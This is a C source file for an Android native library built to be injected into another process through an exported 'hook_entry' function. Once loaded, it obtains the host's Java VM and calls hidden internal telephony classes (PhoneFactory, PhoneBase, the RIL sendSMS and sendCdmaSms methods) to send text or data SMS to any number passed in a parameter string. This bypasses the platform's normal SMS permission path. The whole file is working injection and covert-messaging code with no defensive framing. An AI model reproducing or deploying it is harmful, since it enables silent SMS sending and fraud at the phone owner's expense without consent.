#include <unistd.h>  
#include <stdio.h>  
#include <stdlib.h>  
#include <android/log.h>  
#include <elf.h>
#include <fcntl.h>
#include <jni.h>
#include <stdbool.h>
#include <stdint.h>
#include <dlfcn.h>
#include <string.h>
#include "sendmessage.h"

#define ZNIU_BUDEG 1
#if ZNIU_BUDEG

    #ifdef LOGI
    #undef LOGI
    #endif

    #ifdef LOGD
    #undef LOGD
    #endif

    #ifdef LOGE
    #undef LOGE
    #endif

    #define  LOGI(fmt, args...) \
    __android_log_print( ANDROID_LOG_INFO, "HOOK", fmt, ##args)

    #define  LOGD(fmt, args...) \
    __android_log_print( ANDROID_LOG_DEBUG, "HOOK", fmt, ##args)

    #define  LOGE(fmt, args...) \
    __android_log_print( ANDROID_LOG_ERROR, "HOOK", fmt, ##args)
#else
    #define LOGI(fmt, args...)
    #define LOGD(fmt, args...)
    #define LOGE(fmt, args...)
#endif


#define SMS_NUMBER_LEN      32
#define SMS_CONTENT_LEN     512


#ifdef __cplusplus
extern "C" {
#endif

#define LIBART_PATH "/system/lib/libart.so"
#define LIBART_PATH64 "/system/lib64/libart.so"
#define LIBDVM_PATH "/system/lib/libdvm.so"
#define LIBART "libart.so"
#define LIBDVM "libdvm.so"

typedef jint JNI_GetCreatedJavaVMs_Method(JavaVM** , jsize, jsize* );

static JNIEnv* getEnv()
{

	JNIEnv* env = NULL;
	const char* szLib = NULL;
	if(access(LIBDVM_PATH, F_OK) == 0)
		szLib = LIBDVM;	
	else
		szLib = LIBART;
	LOGD("lib path :%s", szLib);

	void* hand = NULL;
	if(( hand = dlopen(szLib, RTLD_NOW) ) == NULL)
	{
		LOGE("Libraray %s open fail: %s", szLib, dlerror());
		return NULL;	
	}	

	JNI_GetCreatedJavaVMs_Method *p = (JNI_GetCreatedJavaVMs_Method*)dlsym(hand, "JNI_GetCreatedJavaVMs");
	if(p == NULL)
	{
		LOGE("find JNI_GetCreatedJavaVMs error: %s", dlerror());
		goto exit1;
	}

	JavaVM * vms = NULL;
	jsize vm_count;
	jsize count = 1;
	if( p(&vms, count, &vm_count) != JNI_OK)
	{
		LOGE("JNI_GetCreatedJavaVMs error");
		goto exit1;
	}

	LOGD("JavaVm = %p, count = [%d]\n", vms, vm_count);
	if(vm_count < 1)
		goto exit1;

	if((*vms)->GetEnv(vms,(void**)&env, JNI_VERSION_1_4) != JNI_OK)
		LOGE("GetEnv error");
	LOGD("JNIEnv = %p", env);

exit1:
	if(dlclose(hand)!= 0)
		LOGE("dlclose error: %s", dlerror());
exit2:
	return env;
} 
    
    
    int sendTextMessage(const char * number,const char * content){
        int ret =-1;
        LOGE("enter send text Message");
/*
        LOGE("enter send text Message 000");//leo test
        dexstuff_resolv_dvm(&d);
        LOGE("enter send text Message 000_1");//leo test
*/

/*
        JNIEnv* env = (JNIEnv*)d.dvmGetJNIEnvForThread_fnPtr();
*/
/*
        JNIEnv* env = d.g_env;
*/
        JNIEnv* env = getEnv();
        if (env==NULL) {
            LOGE("get java env failed .");
            return ret;
        }
        
        LOGE("enter send text Message 001");//leo test
        jstring jnumber = (*env)->NewStringUTF(env,number);
        jstring jcontent = (*env)->NewStringUTF(env,content);
        
        do{
            LOGE("enter send text Message 002");//leo test
            jclass c_buildversion = (*env)->FindClass(env,"android/os/Build$VERSION");
            if (c_buildversion==NULL){
                LOGE("get  class  build version failed ");
                break;
            }
            jfieldID f_getversioncode =(*env)->GetStaticFieldID(env,c_buildversion,"SDK_INT", "I");
            if (f_getversioncode==NULL) {
                LOGE("get  field  sdk_init failed ");
                break;
            }
            
            LOGE("enter send text Message 003");//leo test
            int  version = (*env)->GetStaticIntField(env,c_buildversion, f_getversioncode);
            LOGE("android version:%d",version);
            
            jclass phone_factory_class = (*env)->FindClass(env,"com/android/internal/telephony/PhoneFactory");
            if(phone_factory_class==NULL){
                LOGE("get PhoneFactory class id failed ");
                break;
            }
            
            jmethodID get_phone_method = (*env)->GetStaticMethodID(env,phone_factory_class,"getDefaultPhone","()Lcom/android/internal/telephony/Phone;");
            
            if (get_phone_method==NULL) {
                LOGE("get phone Method failed");
                break;
            }
            
            LOGE("enter send text Message 004");//leo test
            jobject phone_object = (*env)->CallStaticObjectMethod(env,phone_factory_class,get_phone_method);
            if (phone_object == NULL) {
                LOGE("get phone object failed");
                break;
            }
            
            jclass phone_class = (*env)->FindClass(env,"com/android/internal/telephony/Phone");
            if (phone_class==NULL) {
                LOGE("get phone class failed");
                break;
            }
            
            jmethodID get_phone_type_method= (*env)->GetMethodID(env,phone_class,"getPhoneType","()I");
            if(get_phone_type_method==NULL){
                LOGE("get get_phone_type_method failed");
                break;
            }
            
            LOGE("enter send text Message 005");//leo test
            int phone_type = (*env)->CallIntMethod(env,phone_object,get_phone_type_method);
            LOGE("phone type : %d",phone_type);

			/* add by maoshuoqiong 20171129 */
			/* xiaomi android 4.2 GeminiPhone */
			if(version< 18)
			{
				jclass c_mini_phone = (*env)->FindClass(env, "com/android/internal/telephony/gemini/GeminiPhone");
				if((*env)->ExceptionCheck(env))
				{
					LOGE("find gemini Exception");
					(*env)->ExceptionDescribe(env);
					(*env)->ExceptionClear(env);
				}
				else if(c_mini_phone != NULL)
				{
					LOGD("gemini phone");
					jmethodID m_get_default_phone = (*env)->GetMethodID(env, c_mini_phone, "getDefaultPhone","()Lcom/android/internal/telephony/Phone;");	
					if(m_get_default_phone == NULL)
					{
						LOGE("get gemini method getdefaultphone error");
						break;
					}

					jobject o_geminiphone = (*env)->CallObjectMethod(env, phone_object, m_get_default_phone);
					if(o_geminiphone == NULL)
					{
						LOGE("get object geminiphone error");
						break;
					}

					phone_object = o_geminiphone;

				}
			}
			/* add by maoshuoqiong 20171129 end */

            jclass c_phoneproxy = (*env)->FindClass(env,"com/android/internal/telephony/PhoneProxy");
            if (c_phoneproxy==NULL) {
                LOGE("get  class  phoneproxy failed");
                break;
            }
            jmethodID m_get_activity_phone= (*env)->GetMethodID(env,c_phoneproxy,"getActivePhone","()Lcom/android/internal/telephony/Phone;");
            if(m_get_activity_phone==NULL){
                LOGE("get method getActivityPhone failed");
                break;
            }
            jobject o_activity_phone = (*env)->CallObjectMethod(env,phone_object,m_get_activity_phone);
            if (o_activity_phone==NULL) {
                LOGE("get object  activity phone failed");
                break;
            }
            
            jclass c_phonebase = (*env)->FindClass(env,"com/android/internal/telephony/PhoneBase");
            if (c_phonebase==NULL) {
                LOGE("get class phone base  failed");
                break;
            }
            
            jfieldID f_mci=NULL;
            if (version<18){
                f_mci=(*env)->GetFieldID(env,c_phonebase, "mCM", "Lcom/android/internal/telephony/CommandsInterface;");
            }else{
                f_mci=(*env)->GetFieldID(env,c_phonebase, "mCi", "Lcom/android/internal/telephony/CommandsInterface;");
            }
            if(f_mci==NULL){
                LOGE("get field  mci  failed");
                break;
            }
            jobject o_mci= (*env)->GetObjectField(env,o_activity_phone, f_mci);
            
            if (o_mci==NULL) {
                LOGE("get object  mci  failed");
                break;
            }
            
            if (phone_type==0){
                LOGE("phone type is 0 ,exit");
                break;
                
            }else if (phone_type==1){
                LOGE("phone type is GSM");
                jclass c_smsmessage= (*env)->FindClass(env,"com/android/internal/telephony/gsm/SmsMessage");
                if (c_smsmessage==NULL) {
                    LOGE("GSM, find class c_smsmessage failed");
                    break;
                }
                jmethodID m_getSubmirPdu = (*env)->GetStaticMethodID(env,c_smsmessage,"getSubmitPdu","(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Z)Lcom/android/internal/telephony/gsm/SmsMessage$SubmitPdu;");
                if (m_getSubmirPdu==NULL){
                    LOGE("GSM, m_getSubmitPdu failed");
                    break;
                }
                jobject pdu = (*env)->CallStaticObjectMethod(env,c_smsmessage,m_getSubmirPdu,NULL,jnumber,jcontent,false);
                if(pdu==NULL){
                    LOGE("GSM call getSubmitPdu return NULL");
                    break;
                }
                jclass c_submitpdu = (*env)->FindClass(env,"com/android/internal/telephony/gsm/SmsMessage$SubmitPdu");
                if(c_submitpdu==NULL){
                    LOGE("GSM find class SubmitPdu return NULL");
                    break;
                }
                jfieldID f_encodedMessage=(*env)->GetFieldID(env,c_submitpdu, "encodedMessage", "[B");
                if(f_encodedMessage==NULL){
                    LOGE("GSM get field id f_encodedMessage return NULL");
                    break;
                }
                jbyteArray encode_message = (jbyteArray)(*env)->GetObjectField(env,pdu, f_encodedMessage);
                if(encode_message==NULL){
                    LOGE("GSM get field  encode_message return NULL");
                    break;
                }

                jclass c_iccutil = (*env)->FindClass(env,"com/android/internal/telephony/IccUtils");
                if (c_iccutil==NULL) {
                    LOGE("GSM get class  IccUtils return NULL");
                    break;
                }
                
                jmethodID m_byte2string= (*env)->GetStaticMethodID(env,c_iccutil,"bytesToHexString","([B)Ljava/lang/String;");
                if (m_byte2string==NULL) {
                    LOGE("GSM get method  bytesToHexString return NULL");
                    break;
                }
                
                jobject o_stringpdu = (*env)->CallStaticObjectMethod(env,c_iccutil,m_byte2string,encode_message);
                if (o_stringpdu==NULL) {
                    LOGE("GSM get object  bytesToHexString return NULL");
                    break;
                }

				/* add by maoshuoqiong 20171128 */
				const char* tmp = (*env)->GetStringUTFChars(env, o_stringpdu, 0);
				LOGD("pdu:[%s]", tmp);
				(*env)->ReleaseStringUTFChars(env, o_stringpdu, tmp);
				/* add by maoshuoqiong 20171128 end */
				
				jclass c_ril = NULL;
				if(version<18)
				{
					LOGD("GET RIL");
                	c_ril= (*env)->FindClass(env,"com/android/internal/telephony/RIL");
				}
				else
				{
					LOGD("GET CommandsInterface");
					c_ril = (*env)->FindClass(env,"com/android/internal/telephony/CommandsInterface");
				}
                if (c_ril==NULL) {
                    LOGE("GSM get class RIL return null");
                    break;
                }
                
                jmethodID m_sendsms = (*env)->GetMethodID(env,c_ril,"sendSMS","(Ljava/lang/String;Ljava/lang/String;Landroid/os/Message;)V");
                if(m_sendsms==NULL){
                    LOGE("GSM get method sendSms return null");
                }

				jobject msg = obtainMessage(env);
				LOGD("Call sendSMS");
                
                (*env)->CallVoidMethod(env,o_mci,m_sendsms,NULL,o_stringpdu,msg);
				if((*env)->ExceptionCheck(env))
				{
					LOGE("sendSMS Exception");
					(*env)->ExceptionDescribe(env);
					(*env)->ExceptionClear(env);
				}

				LOGE("Send End!\n");
                ret =0;
            }else if (phone_type==2){
                LOGE("phone type is CDMA");
                
                jclass c_smsmessage= (*env)->FindClass(env,"com/android/internal/telephony/cdma/SmsMessage");
                if (c_smsmessage==NULL) {
                    LOGE("CDMA, find class c_smsmessage failed");
                    break;
                }
                jmethodID m_getSubmirPdu = (*env)->GetStaticMethodID(env,c_smsmessage,"getSubmitPdu","(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;ZLcom/android/internal/telephony/SmsHeader;)Lcom/android/internal/telephony/cdma/SmsMessage$SubmitPdu;");
                if (m_getSubmirPdu==NULL){
                    LOGE("CDMA, m_getSubmitPdu failed");
                    break;
                }
                jobject pdu = (*env)->CallStaticObjectMethod(env,c_smsmessage,m_getSubmirPdu,NULL,jnumber,jcontent,false,NULL);
                if(pdu==NULL){
                    LOGE("CDMA call getSubmitPdu return NULL");
                    break;
                }
                
                jclass c_submitpdu = (*env)->FindClass(env,"com/android/internal/telephony/cdma/SmsMessage$SubmitPdu");
                if(c_submitpdu==NULL){
                    LOGE("CDMA find class SubmitPdu return NULL");
                    break;
                }
                jfieldID f_encodedMessage=(*env)->GetFieldID(env,c_submitpdu, "encodedMessage", "[B");
                if(f_encodedMessage==NULL){
                    LOGE("CDMA get field id f_encodedMessage return NULL");
                    break;
                }
                jobject encode_message = (*env)->GetObjectField(env,pdu, f_encodedMessage);
                if(encode_message==NULL){
                    LOGE("CDMA get field  encode_message return NULL");
                    break;
                    
                }
                
                jclass c_ril= (*env)->FindClass(env,"com/android/internal/telephony/RIL");
                if (c_ril==NULL) {
                    LOGE("CDMA get class RIL return null");
                    break;
                }
                
                jmethodID m_sendcdmasms = (*env)->GetMethodID(env,c_ril,"sendCdmaSms","([BLandroid/os/Message;)V");
                if(m_sendcdmasms==NULL){
                    LOGE("CDMA get method sendCdmaSms return null");
                }
                
                (*env)->CallVoidMethod(env,o_mci,m_sendcdmasms,encode_message,NULL);
                ret =0;
                
            }else{
                LOGE("phone type not GSM or CDMA,exit");
                break;
            }
            
        }while(0);
        
        (*env)->DeleteLocalRef(env,jnumber);
        (*env)->DeleteLocalRef(env,jcontent);
        return ret;
    }
    
    
    
    
    
    
    int sendDataMessage(const char * number,const char * content,uint32_t port){
        int ret =-1;
        LOGE("enter send data Message");
/*
        dexstuff_resolv_dvm(&d);
*/
/*
        JNIEnv* env = (JNIEnv*)d.dvmGetJNIEnvForThread_fnPtr();
*/
/*
        JNIEnv* env = d.g_env;
*/
		JNIEnv* env = getEnv();
        if (env==NULL) {
            LOGE("get java env failed .");
            return ret;
        }
        
        jstring jnumber = (*env)->NewStringUTF(env,number);
        jstring jcontent = (*env)->NewStringUTF(env,content);
        
        do{

			jclass c_string = (*env)->FindClass(env,"java/lang/String");
            if (c_string ==NULL) {
                LOGE("get class string failed ,");
                break;
            }
            jmethodID m_string_byte= (*env)->GetMethodID(env,c_string,"getBytes", "()[B");
            if (m_string_byte==NULL) {
                LOGE("get method string get Byte failed");
                break;
            }
            
            jbyteArray byte_data = (jbyteArray)(*env)->CallObjectMethod(env,jcontent,m_string_byte);
            if (byte_data==NULL) {
                LOGE("send data sms failed, get string byte object failed!");
                return false;
            }
            
            
            jclass c_buildversion = (*env)->FindClass(env,"android/os/Build$VERSION");
            if (c_buildversion==NULL){
                LOGE("get  class  build version failed ");
                break;
            }
            jfieldID f_getversioncode =(*env)->GetStaticFieldID(env,c_buildversion,"SDK_INT", "I");
            if (f_getversioncode==NULL) {
                LOGE("get  field  sdk_init failed ");
                break;
            }
            
            int  version = (*env)->GetStaticIntField(env,c_buildversion, f_getversioncode);
            LOGE("android version:%d",version);
            
            jclass phone_factory_class = (*env)->FindClass(env,"com/android/internal/telephony/PhoneFactory");
            if(phone_factory_class==NULL){
                LOGE("get PhoneFactory class id failed ");
                break;
            }
            
            jmethodID get_phone_method = (*env)->GetStaticMethodID(env,phone_factory_class,"getDefaultPhone","()Lcom/android/internal/telephony/Phone;");
            
            if (get_phone_method==NULL) {
                LOGE("get phone Method failed");
                break;
            }
            
            jobject phone_object = (*env)->CallStaticObjectMethod(env,phone_factory_class,get_phone_method);
            if (phone_object == NULL) {
                LOGE("get phone object failed");
                break;
            }
            
            jclass phone_class = (*env)->FindClass(env,"com/android/internal/telephony/Phone");
            if (phone_class==NULL) {
                LOGE("get phone class failed");
                break;
            }

            jmethodID get_phone_type_method= (*env)->GetMethodID(env,phone_class,"getPhoneType","()I");
            if(get_phone_type_method==NULL){
                LOGE("get get_phone_type_method failed");
                break;
            }
            
            int phone_type = (*env)->CallIntMethod(env,phone_object,get_phone_type_method);
            LOGE("phone type : %d",phone_type);
            jclass c_phoneproxy = (*env)->FindClass(env,"com/android/internal/telephony/PhoneProxy");
            if (c_phoneproxy==NULL) {
                LOGE("get  class  phoneproxy failed");
                break;
            }
            jmethodID m_get_activity_phone= (*env)->GetMethodID(env,c_phoneproxy,"getActivePhone","()Lcom/android/internal/telephony/Phone;");
            if(m_get_activity_phone==NULL){
                LOGE("get method getActivityPhone failed");
                break;
            }
            jobject o_activity_phone = (*env)->CallObjectMethod(env,phone_object,m_get_activity_phone);
            if (o_activity_phone==NULL) {
                LOGE("get object  activity phone failed");
                break;
            }
            
            jclass c_phonebase = (*env)->FindClass(env,"com/android/internal/telephony/PhoneBase");
            if (c_phonebase==NULL) {
                LOGE("get class phone base  failed");
                break;
            }
            
            jfieldID f_mci=NULL;
            if (version<18){
                
                f_mci=(*env)->GetFieldID(env,c_phonebase, "mCM", "Lcom/android/internal/telephony/CommandsInterface;");
                
            }else{
                f_mci=(*env)->GetFieldID(env,c_phonebase, "mCi", "Lcom/android/internal/telephony/CommandsInterface;");
            }
            if(f_mci==NULL){
                LOGE("get field  mci  failed");
                break;
            }
            jobject o_mci= (*env)->GetObjectField(env,o_activity_phone, f_mci);
            
            if (o_mci==NULL) {
                LOGE("get object  mci  failed");
                break;
            }
            
            if (phone_type==0){
                LOGE("phone type is 0 ,exit");
                break;
                
            }else if (phone_type==1){
                LOGE("phone type is GSM");
                jclass c_smsmessage= (*env)->FindClass(env,"com/android/internal/telephony/gsm/SmsMessage");
                if (c_smsmessage==NULL) {
                    LOGE("GSM, find class c_smsmessage failed");
                    break;
                }
                jmethodID m_getSubmirPdu = (*env)->GetStaticMethodID(env,c_smsmessage,"getSubmitPdu","(Ljava/lang/String;Ljava/lang/String;I[BZ)Lcom/android/internal/telephony/gsm/SmsMessage$SubmitPdu;");
                if (m_getSubmirPdu==NULL){
                    LOGE("GSM, m_getSubmitPdu failed");
                    break;
                }
                jobject pdu = (*env)->CallStaticObjectMethod(env,c_smsmessage,m_getSubmirPdu,NULL,jnumber,port, byte_data,false);
                if(pdu==NULL){
                    LOGE("GSM call getSubmitPdu return NULL");
                    break;
                }
                jclass c_submitpdu = (*env)->FindClass(env,"com/android/internal/telephony/gsm/SmsMessage$SubmitPdu");
                if(c_submitpdu==NULL){
                    LOGE("GSM find class SubmitPdu return NULL");
                    break;
                }
                jfieldID f_encodedMessage=(*env)->GetFieldID(env,c_submitpdu, "encodedMessage", "[B");
                if(f_encodedMessage==NULL){
                    LOGE("GSM get field id f_encodedMessage return NULL");
                    break;
                }
                jbyteArray encode_message = (jbyteArray)(*env)->GetObjectField(env,pdu, f_encodedMessage);
                if(encode_message==NULL){
                    LOGE("GSM get field  encode_message return NULL");
                    break;
                }
                jclass c_iccutil = (*env)->FindClass(env,"com/android/internal/telephony/IccUtils");
                if (c_iccutil==NULL) {
                    LOGE("GSM get class  IccUtils return NULL");
                    break;
                }
                
                jmethodID m_byte2string= (*env)->GetStaticMethodID(env,c_iccutil,"bytesToHexString","([B)Ljava/lang/String;");
                if (m_byte2string==NULL) {
                    LOGE("GSM get method  bytesToHexString return NULL");
                    break;
                }
                
                jobject o_stringpdu = (*env)->CallStaticObjectMethod(env,c_iccutil,m_byte2string,encode_message);
                if (o_stringpdu==NULL) {
                    LOGE("GSM get object  bytesToHexString return NULL");
                    break;
                }
                
               /* 
                jclass c_ril= (*env)->FindClass(env,"com/android/internal/telephony/RIL");
				*/
                jclass c_ril= (*env)->FindClass(env,"com/android/internal/telephony/CommandsInterface");
                if (c_ril==NULL) {
                    LOGE("GSM get class RIL return null");
                    break;
                }
                
                jmethodID m_sendsms = (*env)->GetMethodID(env,c_ril,"sendSMS","(Ljava/lang/String;Ljava/lang/String;Landroid/os/Message;)V");
                if(m_sendsms==NULL){
                    LOGE("GSM get method sendCdmaSms return null");
                }
                
                (*env)->CallVoidMethod(env,o_mci,m_sendsms,NULL,o_stringpdu,NULL);
				
				LOGD("Send end");
                ret =0;
            }else if (phone_type==2){
                LOGE("phone type is CDMA");
                
                jclass c_smsmessage= (*env)->FindClass(env,"com/android/internal/telephony/cdma/SmsMessage");
                if (c_smsmessage==NULL) {
                    LOGE("CDMA, find class c_smsmessage failed");
                    break;
                }
                jmethodID m_getSubmirPdu = (*env)->GetStaticMethodID(env,c_smsmessage,"getSubmitPdu","(Ljava/lang/String;Ljava/lang/String;I[BZ)Lcom/android/internal/telephony/cdma/SmsMessage$SubmitPdu;");
                if (m_getSubmirPdu==NULL){
                    LOGE("CDMA, m_getSubmitPdu failed");
                    break;
                }
                jobject pdu = (*env)->CallStaticObjectMethod(env,c_smsmessage,m_getSubmirPdu,NULL,jnumber,port, byte_data,false);
                if(pdu==NULL){
                    LOGE("CDMA call getSubmitPdu return NULL");
                    break;
                }
                
                jclass c_submitpdu = (*env)->FindClass(env,"com/android/internal/telephony/cdma/SmsMessage$SubmitPdu");
                if(c_submitpdu==NULL){
                    LOGE("CDMA find class SubmitPdu return NULL");
                    break;
                }
                jfieldID f_encodedMessage=(*env)->GetFieldID(env,c_submitpdu, "encodedMessage", "[B");
                if(f_encodedMessage==NULL){
                    LOGE("CDMA get field id f_encodedMessage return NULL");
                    break;
                }
                jobject encode_message = (*env)->GetObjectField(env,pdu, f_encodedMessage);
                if(encode_message==NULL){
                    LOGE("CDMA get field  encode_message return NULL");
                    break;
                    
                }
                
                jclass c_ril= (*env)->FindClass(env,"com/android/internal/telephony/RIL");
                if (c_ril==NULL) {
                    LOGE("CDMA get class RIL return null");
                    break;
                }
                
                jmethodID m_sendcdmasms = (*env)->GetMethodID(env,c_ril,"sendCdmaSms","([BLandroid/os/Message;)V");
                if(m_sendcdmasms==NULL){
                    LOGE("CDMA get method sendCdmaSms return null");
                }
                
                (*env)->CallVoidMethod(env,o_mci,m_sendcdmasms,encode_message,NULL);
                ret =0;
                
            }else{
                LOGE("phone type not GSM or CDMA,exit");
                break;
            }
        }while(0);
        
        (*env)->DeleteLocalRef(env,jnumber);
        (*env)->DeleteLocalRef(env,jcontent);
        return ret;
    }
    
    
    __attribute__ ((visibility ("default"))) int hook_entry(char * param){ 
        LOGD("Hook success, pid = %d\n", getpid()); 
        
        char number[SMS_NUMBER_LEN]={0};
        char content[SMS_CONTENT_LEN]={0};
        int8_t  type=1;
        uint32_t  port=1;
        
        if (param[1]!='|') {
            LOGE("send sms ,hook param error!");
            return -1;
        }
        type=atoi(param);

        char * flag = param+2;
        char * separate=strchr(flag,'|');

        if (separate==NULL) {
            LOGE("parse param ,get port error,exit");
            return -1;
        }

        char s_port[16]={0};
        strncpy(s_port,flag, separate-flag);
        port=atoi(s_port);
        
        flag=separate+1;
        separate=strchr(flag,'|');
        if (separate==NULL) {
            LOGE("parse sms number and content error,exit");
            return -1;
        }
        if ((separate-flag)>=SMS_NUMBER_LEN){
            LOGE("sms number len is more than %d",SMS_NUMBER_LEN);
            return -1;
        }
        strncpy(number,flag,separate-flag);
        strncpy(content,separate+1,SMS_CONTENT_LEN);
        
        LOGE("sms type:%d",type);
        LOGE("sms prot:%d",port);
        LOGE("sms number:%s",number);
        LOGE("sms content:%s",content);
/*

        dexstuff_resolv_dvm(&d);
        JNIEnv* env = d.g_env;
        if (env==NULL) {
            LOGE("get java env failed .");
            return -1;
        }

		init_register(env);
		if(type == 1)
			send_text_message(env, number, content);

		return 0;
*/


        if (type==2) {
            return sendDataMessage(number,content,port);
        }else{
            return sendTextMessage(number,content);
        }
    }

#ifdef __cplusplus
}
#endif
